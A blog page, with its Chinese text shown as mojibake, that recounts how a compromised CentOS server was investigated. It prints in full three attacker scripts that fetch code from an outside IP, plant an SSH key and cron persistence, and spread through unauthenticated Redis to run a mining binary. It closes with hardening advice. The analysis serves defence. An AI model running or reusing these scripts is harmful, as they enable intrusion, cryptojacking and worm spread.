<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹ | lvbibir's Blog</title><meta name=keywords content="linux"><meta name=description content="å‘¨ä¸€æ—©ä¸Šåˆšåˆ°åŠå…¬å®¤ï¼Œå°±å¬åˆ°åŒäº‹è¯´æœ‰ä¸€å°æœåŠ¡å™¨ç™»é™†ä¸ä¸Šäº†ï¼Œæˆ‘ä¹Ÿæ²¡æ”¾åœ¨å¿ƒä¸Šï¼Œç»§ç»­è¾¹åƒæ—©ç‚¹ï¼Œè¾¹çœ‹å¸ä»·æ˜¯ä¸æ˜¯åˆè·Œäº†ã€‚ä¸ä¸€ä¼šè¿ç»´çš„åŒäº‹ä¹Ÿåˆ°äº†ï¼Œæ°”å–˜åå"><meta name=author content="
ä½œè€…:&nbsp;lvbibir"><link rel=canonical href=https://www.lvbibir.cn/posts/tech/record-of-server-attacked/><link crossorigin=anonymous href=/assets/css/stylesheet.0b9ebc1d7ded60d00101b645d2188c55f5e06bdf122a4966066c63abd78b2d0e.css integrity="sha256-C568HX3tYNABAbZF0hiMVfXga98SKklmBmxjq9eLLQ4=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://www.lvbibir.cn/img/avatar.gif><link rel=icon type=image/png sizes=16x16 href=https://www.lvbibir.cn/img/avatar.gif><link rel=icon type=image/png sizes=32x32 href=https://www.lvbibir.cn/img/avatar.gif><link rel=apple-touch-icon href=https://www.lvbibir.cn/img/avatar.gif><link rel=mask-icon href=https://www.lvbibir.cn/img/avatar.gif><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script>var _hmt=_hmt||[];(function(){var e,t=document.createElement("script");t.src="",e=document.getElementsByTagName("script")[0],e.parentNode.insertBefore(t,e)})()</script><meta property="og:title" content="è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹"><meta property="og:description" content="å‘¨ä¸€æ—©ä¸Šåˆšåˆ°åŠå…¬å®¤ï¼Œå°±å¬åˆ°åŒäº‹è¯´æœ‰ä¸€å°æœåŠ¡å™¨ç™»é™†ä¸ä¸Šäº†ï¼Œæˆ‘ä¹Ÿæ²¡æ”¾åœ¨å¿ƒä¸Šï¼Œç»§ç»­è¾¹åƒæ—©ç‚¹ï¼Œè¾¹çœ‹å¸ä»·æ˜¯ä¸æ˜¯åˆè·Œäº†ã€‚ä¸ä¸€ä¼šè¿ç»´çš„åŒäº‹ä¹Ÿåˆ°äº†ï¼Œæ°”å–˜åå"><meta property="og:type" content="article"><meta property="og:url" content="https://www.lvbibir.cn/posts/tech/record-of-server-attacked/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2021-08-01T00:00:00+00:00"><meta property="article:modified_time" content="2021-08-01T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹"><meta name=twitter:description content="å‘¨ä¸€æ—©ä¸Šåˆšåˆ°åŠå…¬å®¤ï¼Œå°±å¬åˆ°åŒäº‹è¯´æœ‰ä¸€å°æœåŠ¡å™¨ç™»é™†ä¸ä¸Šäº†ï¼Œæˆ‘ä¹Ÿæ²¡æ”¾åœ¨å¿ƒä¸Šï¼Œç»§ç»­è¾¹åƒæ—©ç‚¹ï¼Œè¾¹çœ‹å¸ä»·æ˜¯ä¸æ˜¯åˆè·Œäº†ã€‚ä¸ä¸€ä¼šè¿ç»´çš„åŒäº‹ä¹Ÿåˆ°äº†ï¼Œæ°”å–˜åå"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":2,"name":"ğŸ“š æ–‡ç« ","item":"https://www.lvbibir.cn/posts/"},{"@type":"ListItem","position":3,"name":"ğŸ‘¨ğŸ»â€ğŸ’» æŠ€æœ¯","item":"https://www.lvbibir.cn/posts/tech/"},{"@type":"ListItem","position":4,"name":"è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹","item":"https://www.lvbibir.cn/posts/tech/record-of-server-attacked/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹","name":"è®°ä¸€æ¬¡æœåŠ¡å™¨è¢«å…¥ä¾µå…¨è¿‡ç¨‹","description":"å‘¨ä¸€æ—©ä¸Šåˆšåˆ°åŠå…¬å®¤ï¼Œå°±å¬åˆ°åŒäº‹è¯´æœ‰ä¸€å°æœåŠ¡å™¨ç™»é™†ä¸ä¸Šäº†ï¼Œæˆ‘ä¹Ÿæ²¡æ”¾åœ¨å¿ƒä¸Šï¼Œç»§ç»­è¾¹åƒæ—©ç‚¹ï¼Œè¾¹çœ‹å¸ä»·æ˜¯ä¸æ˜¯åˆè·Œäº†ã€‚ä¸ä¸€ä¼šè¿ç»´çš„åŒäº‹ä¹Ÿåˆ°äº†ï¼Œæ°”å–˜åå","keywords":["linux"],"articleBody":"å‘¨ä¸€æ—©ä¸Šåˆšåˆ°åŠå…¬å®¤ï¼Œå°±å¬åˆ°åŒäº‹è¯´æœ‰ä¸€å°æœåŠ¡å™¨ç™»é™†ä¸ä¸Šäº†ï¼Œæˆ‘ä¹Ÿæ²¡æ”¾åœ¨å¿ƒä¸Šï¼Œç»§ç»­è¾¹åƒæ—©ç‚¹ï¼Œè¾¹çœ‹å¸ä»·æ˜¯ä¸æ˜¯åˆè·Œäº†ã€‚ä¸ä¸€ä¼šè¿ç»´çš„åŒäº‹ä¹Ÿåˆ°äº†ï¼Œæ°”å–˜ååçš„è¯´ï¼šæˆ‘ä»¬æœ‰å°æœåŠ¡å™¨è¢«é˜¿é‡Œäº‘å†»ç»“äº†ï¼Œç†ç”±ï¼šå¯¹å¤–æ¶æ„å‘åŒ…ã€‚æˆ‘æ”¾ä¸‹é…¸èœé¦…çš„åŒ…å­ï¼Œsshè¿äº†ä¸€ä¸‹ï¼Œè¢«æ‹’ç»äº†ï¼Œé—®äº†ä¸‹é»˜è®¤çš„22ç«¯å£è¢«å°äº†ã€‚è®©è¿ç»´çš„åŒäº‹æŠŠç«¯å£æ”¹äº†ä¸€ä¸‹ï¼Œç«‹é©¬è¿ä¸Šå»ï¼Œé¡ºä¾¿çœ‹äº†ä¸€ä¸‹ç™»å½•å:rootï¼Œè¿˜æœ‰ä¸è¶³8ä½çš„å°ç™½å¯†ç ï¼Œå¿ƒé‡Œä¸€å‡‰ï¼šè¢«é»‘äº†ï¼\næœåŠ¡å™¨ç³»ç»ŸCentOS 6.Xï¼Œéƒ¨ç½²äº†nginxï¼Œtomcatï¼Œredisç­‰åº”ç”¨ï¼Œä¸Šæ¥å…ˆæŠŠæ•°æ®åº“å…¨å¤‡ä»½åˆ°æœ¬åœ°ï¼Œç„¶åtopå‘½ä»¤çœ‹äº†ä¸€ä¸‹ï¼Œæœ‰2ä¸ª99%çš„åŒåè¿›ç¨‹è¿˜åœ¨è¿è¡Œï¼Œå«gpg-agentdã€‚\ngoogleäº†ä¸€ä¸‹gpgï¼Œç»“æœæ˜¯ï¼š\nGPGæä¾›çš„gpg-agentæä¾›äº†å¯¹SSHåè®®çš„æ”¯æŒï¼Œè¿™ä¸ªåŠŸèƒ½å¯ä»¥å¤§å¤§ç®€åŒ–å¯†é’¥çš„ç®¡ç†å·¥ä½œã€‚\nçœ‹èµ·æ¥åƒæ˜¯ä¸€ä¸ªå¾ˆæ­£ç»çš„ç¨‹åºå˜›ï¼Œä½†ä»”ç»†å†çœ‹çœ‹æœåŠ¡å™¨ä¸Šçš„è¿›ç¨‹åé¢è¿˜è·Ÿç€ä¸€ä¸ªå­—æ¯dï¼Œä¼ªè£…çš„å¾ˆå¥½ï¼Œè®©äººæƒ³èµ·æ¥windowsä¸Šå„ç§çœ‹èµ·æ¥åƒsvchost.exeçš„ç—…æ¯’ã€‚ç»§ç»­\nps eho command -p 23374netstat -pan | grep 23374 æŸ¥çœ‹pid:23374è¿›ç¨‹å¯åŠ¨è·¯å¾„å’Œç½‘ç»œçŠ¶å†µï¼Œä¹Ÿå°±æ˜¯æ¥åˆ°äº†å›¾1çš„ç›®å½•ï¼Œåˆ°æ­¤å·²ç»æ‰¾åˆ°äº†é»‘å®¢ç•™ä¸‹çš„äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶ã€‚æ¥ä¸‹æ¥è¿˜æœ‰2ä¸ªé—®é¢˜åœ¨ç­‰ç€æˆ‘ï¼š\n1ã€æ–‡ä»¶æ˜¯æ€ä¹ˆä¸Šä¼ çš„ï¼Ÿ 2ã€è¿™ä¸ªæ–‡ä»¶çš„ç›®çš„æ˜¯ä»€ä¹ˆï¼Œæˆ–æ˜¯é»‘å®¢æƒ³å¹²å˜›ï¼Ÿ\nhistoryçœ‹ä¸€ä¸‹ï¼Œè®°å½•æœç„¶éƒ½è¢«æ¸…æ‰äº†ï¼Œæ²¡ç•™ä¸‹ä»»ä½•ç—•è¿¹ã€‚ç»§ç»­å‘½ä»¤more messagesï¼Œ\nçœ‹åˆ°äº†åœ¨åŠå¤œ12ç‚¹å·¦å³ï¼Œåœ¨æœåŠ¡å™¨ä¸Šè£…äº†å¾ˆå¤šè½¯ä»¶ï¼Œå…¶ä¸­æœ‰å‡ ä¸ªè½¯ä»¶å¼•èµ·äº†æˆ‘çš„æ³¨æ„ï¼Œä¸‹é¢è¯¦ç»†è®²ã€‚è¾¹æ‰¾è¾¹çŒœï¼Œå¦‚æœæˆ‘ä»¬è¦åšåäº‹ï¼Œå¤§æ¦‚ä¼šåœ¨å“ªé‡Œåšæ–‡ç« ï¼Œè‡ªåŠ¨å¯åŠ¨ï¼Ÿå®šæ—¶å¯åŠ¨ï¼Ÿå¯¹ï¼Œè®¡åˆ’ä»»åŠ¡ã€‚\ncrontab -e æœç„¶ï¼Œçº¿ç´¢æ‰¾åˆ°äº†ã€‚\nä¸Šé¢çš„è®¡åˆ’ä»»åŠ¡çš„æ„æ€å°±æ˜¯æ¯15åˆ†é’Ÿå»æœåŠ¡å™¨ä¸Šä¸‹è½½ä¸€ä¸ªè„šæœ¬ï¼Œå¹¶ä¸”æ‰§è¡Œè¿™ä¸ªè„šæœ¬ã€‚æˆ‘ä»¬æŠŠè„šæœ¬ä¸‹è½½ä¸‹æ¥çœ‹ä¸€ä¸‹ã€‚\ncurl -fsSL 159.89.190.243/ash.php \u003e ash.sh è„šæœ¬å†…å®¹å¦‚ä¸‹ï¼š\nuname -aidhostnamesetenforce 0 2\u003e/dev/nullulimit -n 50000ulimit -u 50000crontab -r 2\u003e/dev/nullrm -rf /var/spool/cron/* 2\u003e/dev/nullmkdir -p /var/spool/cron/crontabs 2\u003e/dev/nullmkdir -p /root/.ssh 2\u003e/dev/nullecho 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDfB19N9slQ6uMNY8dVZmTQAQhrdhlMsXVJeUD4AIH2tbg6Xk5PmwOpTeO5FhWRO11dh3inlvxxX5RRa/oKCWk0NNKmMza8YGLBiJsq/zsZYv6H6Haf51FCbTXf6lKt9g4LGoZkpNdhLIwPwDpB/B7nZqQYdTmbpEoCn6oHFYeimMEOqtQPo/szA9pX0RlOHgq7Duuu1ZjR68fTHpgc2qBSG37Sg2aTUR4CRzD4Li5fFXauvKplIim02pEY2zKCLtiYteHc0wph/xBj8wGKpHFP0xMbSNdZ/cmLMZ5S14XFSVSjCzIa0+xigBIrdgo2p5nBtrpYZ2/GN3+ThY+PNUqx redisX' \u003e /root/.ssh/authorized_keysecho '*/15 * * * * curl -fsSL 159.89.190.243/ash.php|sh' \u003e /var/spool/cron/rootecho '*/20 * * * * curl -fsSL 159.89.190.243/ash.php|sh' \u003e /var/spool/cron/crontabs/rootyum install -y bash 2\u003e/dev/nullapt install -y bash 2\u003e/dev/nullapt-get install -y bash 2\u003e/dev/nullbash -c 'curl -fsSL 159.89.190.243/bsh.php|bash' 2\u003e/dev/null å¤§è‡´åˆ†æä¸€ä¸‹è¯¥è„šæœ¬çš„ä¸»è¦ç”¨é€”ï¼š\né¦–å…ˆæ˜¯å…³é—­SELinuxï¼Œè§£é™¤shellèµ„æºè®¿é—®é™åˆ¶ï¼Œç„¶ååœ¨/root/.ssh/authorized_keysæ–‡ä»¶ä¸­ç”Ÿæˆsshå…¬é’¥ï¼Œè¿™æ ·æ¯æ¬¡é»‘å®¢ç™»å½•è¿™å°æœåŠ¡å™¨å°±å¯ä»¥å…å¯†ç ç™»å½•äº†ï¼Œæ‰§è¡Œè„šæœ¬å°±ä¼šæ–¹ä¾¿å¾ˆå¤šï¼Œå…³äºssh keysçš„æ–‡ç« å¯ä»¥å‚è€ƒè¿™ä¸€ç¯‡æ–‡ç« SSHåŸç†ä¸è¿ç”¨ã€‚æ¥ä¸‹æ¥å®‰è£…bashï¼Œæœ€åæ˜¯ç»§ç»­ä¸‹è½½ç¬¬äºŒä¸ªè„šæœ¬bsh.phpï¼Œå¹¶ä¸”æ‰§è¡Œã€‚\nç»§ç»­ä¸‹è½½å¹¶åˆ†æbsh.pbpï¼Œå†…å®¹å¦‚ä¸‹ï¼š\nsleep $( seq 3 7 | sort -R | head -n1 )cd /tmp || cd /var/tmpsleep 1mkdir -p .ICE-unix/... \u0026\u0026 chmod -R 777 .ICE-unix \u0026\u0026 cd .ICE-unix/...sleep 1if [ -f .watch ]; thenrm -rf .watchexit 0fisleep 1echo 1 \u003e .watchsleep 1ps x | awk '!/awk/ \u0026\u0026 /redisscan|ebscan|redis-cli/ {print $1}' | xargs kill -9 2\u003e/dev/nullps x | awk '!/awk/ \u0026\u0026 /barad_agent|masscan|.sr0|clay|udevs|.sshd|xig/ {print $1}' | xargs kill -9 2\u003e/dev/nullsleep 1if ! [ -x /usr/bin/gpg-agentd ]; thencurl -s -o /usr/bin/gpg-agentd 159.89.190.243/dump.dbecho '/usr/bin/gpg-agentd' \u003e /etc/rc.localecho 'curl -fsSL 159.89.190.243/ash.php|sh' \u003e\u003e /etc/rc.localecho 'exit 0' \u003e\u003e /etc/rc.localfisleep 1chmod +x /usr/bin/gpg-agentd \u0026\u0026 /usr/bin/gpg-agentd || rm -rf /usr/bin/gpg-agentdsleep 1if ! [ -x \"$(command -v masscan)\" ]; thenrm -rf /var/lib/apt/lists/*rm -rf x1.tar.gzif [ -x \"$(command -v apt-get)\" ]; thenexport DEBIAN_FRONTEND=noninteractiveapt-get update -yapt-get install -y debconf-docapt-get install -y build-essentialapt-get install -y libpcap0.8-dev libpcap0.8apt-get install -y libpcap*apt-get install -y make gcc gitapt-get install -y redis-serverapt-get install -y redis-toolsapt-get install -y redisapt-get install -y iptablesapt-get install -y wget curlfiif [ -x \"$(command -v yum)\" ]; thenyum update -yyum install -y epel-releaseyum update -yyum install -y git iptables make gcc redis libpcap libpcap-develyum install -y wget curlfisleep 1curl -sL -o x1.tar.gz https://github.com/robertdavidgraham/masscan/archive/1.0.4.tar.gzsleep 1[ -f x1.tar.gz ] \u0026\u0026 tar zxf x1.tar.gz \u0026\u0026 cd masscan-1.0.4 \u0026\u0026 make \u0026\u0026 make install \u0026\u0026 cd .. \u0026\u0026 rm -rf masscan-1.0.4fisleep 3 \u0026\u0026 rm -rf .watchbash -c 'curl -fsSL 159.89.190.243/rsh.php|bash' 2\u003e/dev/null è¿™æ®µè„šæœ¬çš„ä»£ç æ¯”è¾ƒé•¿ï¼Œä½†ä¸»è¦çš„åŠŸèƒ½æœ‰4ä¸ªï¼š\n\\1. ä¸‹è½½è¿œç¨‹ä»£ç åˆ°æœ¬åœ°ï¼Œæ·»åŠ æ‰§è¡Œæƒé™ï¼Œchmod u+xã€‚ \\2. ä¿®æ”¹rc.localï¼Œè®©æœ¬åœ°ä»£ç å¼€æœºè‡ªåŠ¨æ‰§è¡Œã€‚ \\3. ä¸‹è½½githubä¸Šçš„å¼€æºæ‰«æå™¨ä»£ç ï¼Œå¹¶å®‰è£…ç›¸å…³çš„ä¾èµ–è½¯ä»¶ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä¸Šé¢çš„messagesé‡Œçœ‹åˆ°çš„è®°å½•ã€‚ \\4. ä¸‹è½½ç¬¬ä¸‰ä¸ªè„šæœ¬ï¼Œå¹¶ä¸”æ‰§è¡Œã€‚\næˆ‘å»githubä¸Šçœ‹äº†ä¸‹è¿™ä¸ªå¼€æºä»£ç ï¼Œç®€ç›´åŠç‚¸å¤©ã€‚\nMASSCAN: Mass IP port scanner This is the fastest Internet port scanner. It can scan the entire Internet in under 6 minutes, \u003e transmitting 10 million packets per second. It produces results similar to nmap, the most famous port scanner. Internally, it operates more \u003e like scanrand, unicornscan, and ZMap, using asynchronous transmission. The major difference is \u003e that itâ€™s faster than these other scanners. In addition, itâ€™s more flexible, allowing arbitrary \u003e address ranges and port ranges. NOTE: masscan uses a custom TCP/IP stack. Anything other than simple port scans will cause conflict with the local TCP/IP stack. This means you need to either use the -S option to use a separate IP address, or configure your operating system to firewall the ports that masscan uses.\ntransmitting 10 million packets per second(æ¯ç§’å‘é€1000ä¸‡ä¸ªæ•°æ®åŒ…)ï¼Œæ¯”nmapé€Ÿåº¦è¿˜è¦å¿«ï¼Œè¿™å°±ä¸éš¾ç†è§£ä¸ºä»€ä¹ˆé˜¿é‡Œäº‘æŠŠæœåŠ¡å™¨å†»ç»“äº†ï¼Œå¤§æ¦‚çœ‹äº†ä¸‹readmeä¹‹åï¼Œæˆ‘ä¹Ÿæ²¡æœ‰ç»†ç©¶ï¼Œç»§ç»­ä¸‹è½½ç¬¬ä¸‰ä¸ªè„šæœ¬ã€‚\nsetenforce 0 2\u003e/dev/nullulimit -n 50000ulimit -u 50000sleep 1iptables -I INPUT 1 -p tcp --dport 6379 -j DROP 2\u003e/dev/nulliptables -I INPUT 1 -p tcp --dport 6379 -s 127.0.0.1 -j ACCEPT 2\u003e/dev/nullsleep 1rm -rf .dat .shard .ranges .lan 2\u003e/dev/nullsleep 1echo 'config set dbfilename \"backup.db\"' \u003e .datecho 'save' \u003e\u003e .datecho 'flushall' \u003e\u003e .datecho 'set backup1 \" */2 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'set backup2 \" */3 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'set backup3 \" */4 * * * * curl -fsSL http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'set backup4 \" */5 * * * * wget -q -O- http://159.89.190.243/ash.php | sh \"' \u003e\u003e .datecho 'config set dir \"/var/spool/cron/\"' \u003e\u003e .datecho 'config set dbfilename \"root\"' \u003e\u003e .datecho 'save' \u003e\u003e .datecho 'config set dir \"/var/spool/cron/crontabs\"' \u003e\u003e .datecho 'save' \u003e\u003e .datsleep 1masscan --max-rate 10000 -p6379,6380 --shard $( seq 1 22000 | sort -R | head -n1 )/22000 --exclude 255.255.255.255 0.0.0.0/0 2\u003e/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq \u003e .shardsleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u003e/dev/null 1\u003e/dev/null \u0026done \u003c .shardsleep 1masscan --max-rate 10000 -p6379,6380 192.168.0.0/16 172.16.0.0/16 116.62.0.0/16 116.232.0.0/16 116.128.0.0/16 116.163.0.0/16 2\u003e/dev/null | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq \u003e .rangessleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u003e/dev/null 1\u003e/dev/null \u0026done \u003c .rangessleep 1ip a | grep -oE '([0-9]{1,3}.?){4}/[0-9]{2}' 2\u003e/dev/null | sed 's//([0-9]{2})//16/g' \u003e .inetsleep 1masscan --max-rate 10000 -p6379,6380 -iL .inet | awk '{print $6, substr($4, 1, length($4)-4)}' | sort | uniq \u003e .lansleep 1while read -r h p; docat .dat | redis-cli -h $h -p $p --raw 2\u003e/dev/null 1\u003e/dev/null \u0026done \u003c .lansleep 60rm -rf .dat .shard .ranges .lan 2\u003e/dev/null å¦‚æœè¯´å‰ä¸¤ä¸ªè„šæœ¬åªæ˜¯åœ¨æœåŠ¡å™¨ä¸Šä¸‹è½½æ‰§è¡Œäº†äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œé‚£è¿™ä¸ªè„šæœ¬æ‰çœŸæ­£æ˜¾ç¤ºç—…æ¯’çš„å¨åŠ›ã€‚ä¸‹é¢å°±æ¥åˆ†æè¿™ä¸ªè„šæœ¬ã€‚\nä¸€å¼€å§‹çš„ä¿®æ”¹ç³»ç»Ÿç¯å¢ƒæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œæ¥ä¸‹æ¥çš„å†™æ–‡ä»¶æ“ä½œæœ‰ç‚¹çœ¼ç†Ÿï¼Œå¦‚æœç”¨è¿‡redisçš„äººï¼Œåº”è¯¥èƒ½çŒœåˆ°ï¼Œè¿™é‡Œæ˜¯å¯¹redisè¿›è¡Œé…ç½®ã€‚å†™è¿™ä¸ªé…ç½®ï¼Œè‡ªç„¶ä¹Ÿå°±æ˜¯åˆ©ç”¨äº†redisæŠŠç¼“å­˜å†…å®¹å†™å…¥æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ï¼Œç»“æœå°±æ˜¯ç”¨æœ¬åœ°çš„ç§é’¥å»ç™»é™†è¢«å†™å…¥å…¬é’¥çš„æœåŠ¡å™¨äº†ï¼Œæ— éœ€å¯†ç å°±å¯ä»¥ç™»é™†ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬æ–‡ç« æœ€å¼€å§‹çš„/root/.ssh/authorized_keysã€‚ç™»å½•ä¹‹åå°±å¼€å§‹å®šæœŸæ‰§è¡Œè®¡åˆ’ä»»åŠ¡ï¼Œä¸‹è½½è„šæœ¬ã€‚å¥½äº†ï¼Œé…ç½®æ–‡ä»¶å‡†å¤‡å¥½äº†ï¼Œå°±å¼€å§‹åˆ©ç”¨masscanè¿›è¡Œå…¨ç½‘æ‰«æredisæœåŠ¡å™¨ï¼Œå¯»æ‰¾è‚‰é¸¡ï¼Œæ³¨æ„çœ‹è¿™6379å°±æ˜¯redisæœåŠ¡å™¨çš„é»˜è®¤ç«¯å£ï¼Œå¦‚æœä½ çš„redisçš„ç›‘å¬ç«¯å£æ˜¯å…¬ç½‘IPæˆ–æ˜¯0.0.0.0ï¼Œå¹¶ä¸”æ²¡æœ‰å¯†ç ä¿æŠ¤ï¼Œä¸å¥½æ„æ€ï¼Œä½ å°±ä¸­æ‹›äº†ã€‚\né€šè¿‡ä¾æ¬¡åˆ†æè¿™3ä¸ªè„šæœ¬ï¼Œå°±èƒ½çœ‹å‡ºè¿™ä¸ªç—…æ¯’çš„å¯æ€•ä¹‹å¤„ï¼Œå…ˆæ˜¯é€šè¿‡å†™å…¥ssh public key æ‹¿åˆ°ç™»å½•æƒé™ï¼Œç„¶åä¸‹è½½æ‰§è¡Œè¿œç¨‹äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œæœ€åå†é€šè¿‡redisæ¼æ´å¤åˆ¶ï¼Œè¿…é€Ÿåœ¨å…¨ç½‘ä¼ æ’­ï¼Œä»¥æŒ‡æ•°çº§é€Ÿåº¦å¢é•¿ã€‚é‚£ä¹ˆé—®é¢˜æ˜¯ï¼Œè¿™å°æœåŠ¡å™¨æ˜¯æ€ä¹ˆä¸­æ‹›çš„å‘¢ï¼Ÿçœ‹äº†ä¸‹redis.confï¼Œbindçš„åœ°å€æ˜¯127.0.0.1ï¼Œæ²¡å•¥é—®é¢˜ã€‚ç”±æ­¤å¯ä»¥æ¨æ–­ï¼Œåº”è¯¥æ˜¯rootå¸å·è¢«æš´åŠ›ç ´è§£äº†ï¼Œä¸ºäº†éªŒè¯æˆ‘çš„æƒ³æ³•ï¼Œæˆ‘lastbçœ‹äº†ä¸€ä¸‹ï¼Œæœç„¶æœ‰å¤§é‡çš„è®°å½•ï¼š\nè¿˜å‰©æœ€åä¸€ä¸ªé—®é¢˜ï¼Œè¿™ä¸ªgpg-agentdç¨‹åºåˆ°åº•æ˜¯å¹²ä»€ä¹ˆçš„å‘¢ï¼Ÿæˆ‘å½“æ—¶çš„ç¬¬ä¸€ä¸ªååº”å°±æ˜¯çŸ¿æœºï¼Œå› ä¸ºç°åœ¨æ•°å­—è´§å¸å¤ªç«äº†ï¼ŒåŠ å¤§äº†åˆ†å¸ƒå¼çŸ¿æœºçš„éœ€æ±‚ï¼Œä¹Ÿå°±å‚¬ç”Ÿäº†è¿™æ¡ç°è‰²äº§ä¸šé“¾ã€‚äºæ˜¯ï¼Œé¡ºæ‰‹æŠŠè¿™ä¸ªgpg-agentdæ‹–åˆ°idaä¸­ï¼Œç”¨stringæœç´¢bitcoin,eth, mineç­‰ç›¸å…³å•è¯ï¼Œæœ€ç»ˆå‘ç°äº†è¿™ä¸ªï¼š\næ‰“å¼€ nicehash.com çœ‹ä¸€ä¸‹ï¼Œä¸€åˆ‡éƒ½æ¸…æ™°äº†ã€‚\nä¸€ã€æœåŠ¡å™¨\n\\1. ç¦ç”¨ROOT \\2. ç”¨æˆ·åå’Œå¯†ç å°½é‡å¤æ‚ \\3. ä¿®æ”¹sshçš„é»˜è®¤22ç«¯å£ \\4. å®‰è£…DenyHostsé˜²æš´åŠ›ç ´è§£è½¯ä»¶ \\5. ç¦ç”¨å¯†ç ç™»å½•ï¼Œä½¿ç”¨RSAå…¬é’¥ç™»å½•\näºŒã€redis\n\\1. ç¦ç”¨å…¬ç½‘IPç›‘å¬ï¼ŒåŒ…æ‹¬0.0.0.0 \\2. ä½¿ç”¨å¯†ç é™åˆ¶è®¿é—®redis \\3. ä½¿ç”¨è¾ƒä½æƒé™å¸å·è¿è¡Œredis\nåŸæ–‡é“¾æ¥ï¼šhttps://mp.weixin.qq.com/s/FUv-7-1C30U-A81bDn8dbA\n","wordCount":"2801","inLanguage":"en","datePublished":"2021-08-01T00:00:00Z","dateModified":"2021-08-01T00:00:00Z","author":[{"@type":"Person","name":"lvbibir"}],"mainEntityOfPage":{"@type":"WebPage","@id":"https://www.lvbibir.cn/posts/tech/record-of-server-attacked/"},"publisher":{"@type":"Organization","name":"lvbibir's Blog","logo":{"@type":"ImageObject","url":"https://www.lvbibir.cn/img/avatar.gif"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://www.lvbibir.cn accesskey=h title="lvbibir's Blog (Alt + H)"><img src=https://www.lvbibir.cn/img/avatar.gif alt aria-label=logo height=35>lvbibir's Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://www.lvbibir.cn/search title="ğŸ” æœç´¢ (Alt + /)" accesskey=/><span>ğŸ” æœç´¢</span></a></li><li><a href=https://www.lvbibir.cn/ title="ğŸ¡ ä¸»é¡µ"><span>ğŸ¡ ä¸»é¡µ</span></a></li><li><a href=https://www.lvbibir.cn/posts title="ğŸ“š æ–‡ç« "><span>ğŸ“š æ–‡ç« </span></a></li><li><a href=https://www.lvbibir.cn/tags title="ğŸ·ï¸ æ ‡ç­¾"><span>ğŸ·ï¸ æ ‡ç­¾</span></a></li><li><a href=https://www.lvbibir.cn/archives title="ğŸ“ˆ æ—¶é—´è½´"><span>ğŸ“ˆ æ—¶é—´è½´</span></a></li><li><a href=https://www.lvbibir.cn/about title="ğŸ™‹ğŸ»â€â™‚ï¸ 